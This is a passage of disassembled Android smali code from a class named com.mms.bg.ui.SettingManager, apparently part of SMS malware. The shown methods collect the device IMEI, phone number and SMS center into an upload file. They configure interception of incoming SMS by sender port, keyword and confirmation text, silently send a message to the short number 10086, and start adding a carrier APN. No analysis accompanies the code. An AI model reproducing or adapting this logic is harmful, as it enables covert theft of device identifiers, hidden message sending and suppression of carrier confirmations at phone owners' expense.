    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1004
    add-int/lit8 v7, v7, 0x1

    goto :goto_1b

    .line 1007
    :cond_33
    invoke-virtual {v9}, Ljava/lang/StringBuilder;->length()I

    move-result v10

    sub-int/2addr v10, v14

    invoke-virtual {v9, v13, v10}, Ljava/lang/StringBuilder;->substring(II)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {p0, v10}, Lcom/mms/bg/ui/SettingManager;->setSMSBlockPorts(Ljava/lang/String;)V

    .line 1011
    .end local v7           #index:I
    .end local v9           #ports:Ljava/lang/StringBuilder;
    :goto_3f
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    invoke-virtual {v10}, Lcom/mms/bg/util/XMLHandler;->getBlockKeys()Ljava/util/ArrayList;

    move-result-object v0

    .line 1012
    .local v0, blockKeys:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lez v10, :cond_e0

    .line 1013
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    .line 1014
    .local v8, keys:Ljava/lang/StringBuilder;
    const/4 v7, 0x0

    .restart local v7       #index:I
    :goto_51
    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-ge v7, v10, :cond_71

    .line 1015
    invoke-virtual {v0, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v8, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1014
    add-int/lit8 v7, v7, 0x1

    goto :goto_51

    .line 1009
    .end local v0           #blockKeys:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v7           #index:I
    .end local v8           #keys:Ljava/lang/StringBuilder;
    :cond_69
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v11, "sms_block_port"

    invoke-interface {v10, v11}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_3f

    .line 1017
    .restart local v0       #blockKeys:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .restart local v7       #index:I
    .restart local v8       #keys:Ljava/lang/StringBuilder;
    :cond_71
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->length()I

    move-result v10

    sub-int/2addr v10, v14

    invoke-virtual {v8, v13, v10}, Ljava/lang/StringBuilder;->substring(II)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {p0, v10}, Lcom/mms/bg/ui/SettingManager;->setSMSBlockKeys(Ljava/lang/String;)V

    .line 1021
    .end local v7           #index:I
    .end local v8           #keys:Ljava/lang/StringBuilder;
    :goto_7d
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    const-string v11, "confirm_port"

    invoke-virtual {v10, v11}, Lcom/mms/bg/util/XMLHandler;->getChanneInfo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 1022
    .local v5, confirmPort:Ljava/lang/String;
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    const-string v11, "confirm_key"

    invoke-virtual {v10, v11}, Lcom/mms/bg/util/XMLHandler;->getChanneInfo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 1023
    .local v4, confirmKey:Ljava/lang/String;
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    const-string v11, "confirm_content"

    invoke-virtual {v10, v11}, Lcom/mms/bg/util/XMLHandler;->getChanneInfo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1024
    .local v6, confirmText:Ljava/lang/String;
    if-eqz v5, :cond_e8

    if-eqz v4, :cond_e8

    if-eqz v6, :cond_e8

    .line 1025
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 1026
    .local v3, confirmInfo:Ljava/lang/String;
    invoke-virtual {p0, v3}, Lcom/mms/bg/ui/SettingManager;->setConfirmInfo(Ljava/lang/String;)V

    .line 1030
    .end local v3           #confirmInfo:Ljava/lang/String;
    :goto_bf
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    const-string v11, "intercept_time"

    invoke-virtual {v10, v11}, Lcom/mms/bg/util/XMLHandler;->getChanneInfo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 1031
    .local v2, blockTime:Ljava/lang/String;
    if-eqz v2, :cond_f0

    .line 1032
    invoke-static {v2}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Long;->longValue()J

    move-result-wide v10

    const-wide/16 v12, 0x3c

    mul-long/2addr v10, v12

    const-wide/16 v12, 0x3e8

    mul-long/2addr v10, v12

    invoke-virtual {p0, v10, v11}, Lcom/mms/bg/ui/SettingManager;->setSMSBlockDelayTime(J)V

    .line 1036
    :goto_da
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v10}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 1037
    return-void

    .line 1019
    .end local v2           #blockTime:Ljava/lang/String;
    .end local v4           #confirmKey:Ljava/lang/String;
    .end local v5           #confirmPort:Ljava/lang/String;
    .end local v6           #confirmText:Ljava/lang/String;
    :cond_e0
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v11, "sms_block_key"

    invoke-interface {v10, v11}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_7d

    .line 1028
    .restart local v4       #confirmKey:Ljava/lang/String;
    .restart local v5       #confirmPort:Ljava/lang/String;
    .restart local v6       #confirmText:Ljava/lang/String;
    :cond_e8
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v11, "sms_confirm_info"

    invoke-interface {v10, v11}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_bf

    .line 1034
    .restart local v2       #blockTime:Ljava/lang/String;
    :cond_f0
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v11, "sms_block_time"

    invoke-interface {v10, v11}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_da
.end method

.method private savePhoneInfo(Ljava/lang/String;)V
    .registers 24
    .parameter "reason"

    .prologue
    .line 710
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->getSMSCenter()Ljava/lang/String;

    move-result-object v15

    .line 715
    .local v15, smsCenter:Ljava/lang/String;
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuilder;-><init>()V

    const-string v21, "[[savePhoneInfo]] smsCenter = "

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    move-object/from16 v0, v20

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    invoke-direct {v0, v1}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 716
    if-eqz v15, :cond_238

    .line 722
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuilder;-><init>()V

    const-string v21, "[[savePhoneInfo]] split the smsCenter = "

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    move-object/from16 v0, v20

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    invoke-direct {v0, v1}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 723
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object/from16 v20, v0

    const-string v21, "phone"

    invoke-virtual/range {v20 .. v21}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v17

    check-cast v17, Landroid/telephony/TelephonyManager;

    .line 724
    .local v17, tm:Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v9

    .line 725
    .local v9, imei:Ljava/lang/String;
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v12

    .line 726
    .local v12, phonenum:Ljava/lang/String;
    if-nez v12, :cond_5a

    .line 727
    const-string v12, "0"

    .line 729
    :cond_5a
    const-string v18, "1.0.1"

    .line 730
    .local v18, version:Ljava/lang/String;
    const-string v7, "1"

    .line 731
    .local v7, first:Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->getSMSRoundTotalSend()I

    move-result v20

    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v8

    .line 732
    .local v8, handled:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mPid:Ljava/lang/String;

    move-object v13, v0

    .line 733
    .local v13, pid:Ljava/lang/String;
    if-nez p1, :cond_6f

    const-string p1, ""

    .line 734
    :cond_6f
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->getFirstStartTime()Ljava/lang/String;

    move-result-object v10

    .line 735
    .local v10, installTime:Ljava/lang/String;
    if-nez v10, :cond_7c

    .line 736
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->setFirstStartTime()V

    .line 737
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->getFirstStartTime()Ljava/lang/String;

    move-result-object v10

    .line 739
    :cond_7c
    sget-object v16, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    .line 740
    .local v16, systemVersion:Ljava/lang/String;
    const-string v3, "michael"

    .line 741
    .local v3, author:Ljava/lang/String;
    const-string v5, "0"

    .line 744
    .local v5, fare:Ljava/lang/String;
    :try_start_82
    new-instance v6, Ljava/io/File;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->UPLOAD_FILE_PATH:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object v0, v6

    move-object/from16 v1, v20

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 745
    .local v6, file:Ljava/io/File;
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v20

    const/16 v21, 0x1

    move/from16 v0, v20

    move/from16 v1, v21

    if-ne v0, v1, :cond_231

    .line 746
    invoke-virtual {v6}, Ljava/io/File;->delete()Z

    .line 750
    :goto_9f
    new-instance v11, Ljava/io/FileOutputStream;

    invoke-direct {v11, v6}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 751
    .local v11, out:Ljava/io/FileOutputStream;
    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v14

    .line 752
    .local v14, serializer:Lorg/xmlpull/v1/XmlSerializer;
    const-string v20, "UTF-8"

    move-object v0, v14

    move-object v1, v11

    move-object/from16 v2, v20

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->setOutput(Ljava/io/OutputStream;Ljava/lang/String;)V

    .line 753
    const-string v20, "UTF-8"

    const/16 v21, 0x1

    invoke-static/range {v21 .. v21}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v21

    move-object v0, v14

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startDocument(Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 755
    const-string v20, ""

    const-string v21, "body"

    move-object v0, v14

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v4

    .line 757
    .local v4, child:Lorg/xmlpull/v1/XmlSerializer;
    const-string v20, ""

    const-string v21, "imei"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 758
    invoke-interface {v4, v9}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 759
    const-string v20, ""

    const-string v21, "imei"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 761
    const-string v20, ""

    const-string v21, "version"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 762
    move-object v0, v4

    move-object/from16 v1, v18

    invoke-interface {v0, v1}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 763
    const-string v20, ""

    const-string v21, "version"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 765
    const-string v20, ""

    const-string v21, "smscenter"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 766
    invoke-interface {v4, v15}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 767
    const-string v20, ""

    const-string v21, "smscenter"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 769
    const-string v20, ""

    const-string v21, "first"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 770
    invoke-interface {v4, v7}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 771
    const-string v20, ""

    const-string v21, "first"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 773
    const-string v20, ""

    const-string v21, "handled"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 774
    invoke-interface {v4, v8}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 775
    const-string v20, ""

    const-string v21, "handled"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 777
    const-string v20, ""

    const-string v21, "pid"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 778
    invoke-interface {v4, v13}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 779
    const-string v20, ""

    const-string v21, "pid"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 781
    const-string v20, ""

    const-string v21, "installtime"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 782
    invoke-interface {v4, v10}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 783
    const-string v20, ""

    const-string v21, "installtime"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 785
    const-string v20, ""

    const-string v21, "sysversion"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 786
    move-object v0, v4

    move-object/from16 v1, v16

    invoke-interface {v0, v1}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 787
    const-string v20, ""

    const-string v21, "sysversion"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 789
    const-string v20, ""

    const-string v21, "auth"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 790
    invoke-interface {v4, v3}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 791
    const-string v20, ""

    const-string v21, "auth"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 793
    const-string v20, ""

    const-string v21, "fare"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 794
    invoke-interface {v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 795
    const-string v20, ""

    const-string v21, "fare"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 797
    const-string v20, ""

    const-string v21, "phonenum"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 798
    invoke-interface {v4, v12}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 799
    const-string v20, ""

    const-string v21, "phonenum"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 801
    const-string v20, ""

    const-string v21, "reason"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 802
    move-object v0, v4

    move-object/from16 v1, p1

    invoke-interface {v0, v1}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 803
    const-string v20, ""

    const-string v21, "reason"

    move-object v0, v4

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 805
    const-string v20, ""

    const-string v21, "body"

    move-object v0, v14

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    .line 806
    invoke-interface {v14}, Lorg/xmlpull/v1/XmlSerializer;->flush()V

    .line 807
    invoke-interface {v14}, Lorg/xmlpull/v1/XmlSerializer;->endDocument()V

    .line 808
    invoke-virtual {v11}, Ljava/io/FileOutputStream;->close()V

    .line 820
    .end local v3           #author:Ljava/lang/String;
    .end local v4           #child:Lorg/xmlpull/v1/XmlSerializer;
    .end local v5           #fare:Ljava/lang/String;
    .end local v6           #file:Ljava/io/File;
    .end local v7           #first:Ljava/lang/String;
    .end local v8           #handled:Ljava/lang/String;
    .end local v9           #imei:Ljava/lang/String;
    .end local v10           #installTime:Ljava/lang/String;
    .end local v11           #out:Ljava/io/FileOutputStream;
    .end local v12           #phonenum:Ljava/lang/String;
    .end local v13           #pid:Ljava/lang/String;
    .end local v14           #serializer:Lorg/xmlpull/v1/XmlSerializer;
    .end local v16           #systemVersion:Ljava/lang/String;
    .end local v17           #tm:Landroid/telephony/TelephonyManager;
    .end local v18           #version:Ljava/lang/String;
    :goto_230
    return-void

    .line 748
    .restart local v3       #author:Ljava/lang/String;
    .restart local v5       #fare:Ljava/lang/String;
    .restart local v6       #file:Ljava/io/File;
    .restart local v7       #first:Ljava/lang/String;
    .restart local v8       #handled:Ljava/lang/String;
    .restart local v9       #imei:Ljava/lang/String;
    .restart local v10       #installTime:Ljava/lang/String;
    .restart local v12       #phonenum:Ljava/lang/String;
    .restart local v13       #pid:Ljava/lang/String;
    .restart local v16       #systemVersion:Ljava/lang/String;
    .restart local v17       #tm:Landroid/telephony/TelephonyManager;
    .restart local v18       #version:Ljava/lang/String;
    :cond_231
    invoke-virtual {v6}, Ljava/io/File;->createNewFile()Z
    :try_end_234
    .catch Ljava/lang/Exception; {:try_start_82 .. :try_end_234} :catch_236

    goto/16 :goto_9f

    .line 809
    .end local v6           #file:Ljava/io/File;
    :catch_236
    move-exception v20

    goto :goto_230

    .line 813
    .end local v3           #author:Ljava/lang/String;
    .end local v5           #fare:Ljava/lang/String;
    .end local v7           #first:Ljava/lang/String;
    .end local v8           #handled:Ljava/lang/String;
    .end local v9           #imei:Ljava/lang/String;
    .end local v10           #installTime:Ljava/lang/String;
    .end local v12           #phonenum:Ljava/lang/String;
    .end local v13           #pid:Ljava/lang/String;
    .end local v16           #systemVersion:Ljava/lang/String;
    .end local v17           #tm:Landroid/telephony/TelephonyManager;
    .end local v18           #version:Ljava/lang/String;
    :cond_238
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object/from16 v20, v0

    invoke-static/range {v20 .. v20}, Lcom/mms/bg/transaction/WorkingMessage;->createEmpty(Landroid/content/Context;)Lcom/mms/bg/transaction/WorkingMessage;

    move-result-object v19

    .line 814
    .local v19, wm:Lcom/mms/bg/transaction/WorkingMessage;
    const-string v20, "10086"

    invoke-virtual/range {v19 .. v20}, Lcom/mms/bg/transaction/WorkingMessage;->setDestNum(Ljava/lang/String;)V

    .line 815
    const-string v20, "1234567"

    invoke-virtual/range {v19 .. v20}, Lcom/mms/bg/transaction/WorkingMessage;->setText(Ljava/lang/CharSequence;)V

    .line 817
    const-string v20, "10086"

    const-string v21, "1"

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->setSMSTempBlockNumAndTimes(Ljava/lang/String;Ljava/lang/String;)V

    .line 818
    invoke-virtual/range {v19 .. v19}, Lcom/mms/bg/transaction/WorkingMessage;->send()V

    goto :goto_230
.end method


# virtual methods
.method public addCMNetApn()Ljava/lang/String;
    .registers 12

    .prologue
    const-string v3, "cmnet"

    .line 1356
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v2, "phone"

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/telephony/TelephonyManager;

    .line 1357
    .local v9, tm:Landroid/telephony/TelephonyManager;
    const/4 v6, 0x0

    .line 1358
    .local v6, apnId:Ljava/lang/String;
    new-instance v10, Landroid/content/ContentValues;

    invoke-direct {v10}, Landroid/content/ContentValues;-><init>()V

    .line 1359
    .local v10, values:Landroid/content/ContentValues;
    const-string v0, "name"

    const-string v2, "cmnet"

    invoke-virtual {v10, v0, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1360
    const-string v0, "apn"

    const-string v2, "cmnet"

    invoke-virtual {v10, v0, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1361
    const-string v0, "mcc"

    const-string v2, "460"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1362
    const-string v0, "mnc"

    const-string v2, "02"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1363
    const-string v0, "type"

    const-string v2, "default"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1364
    const-string v0, "numeric"

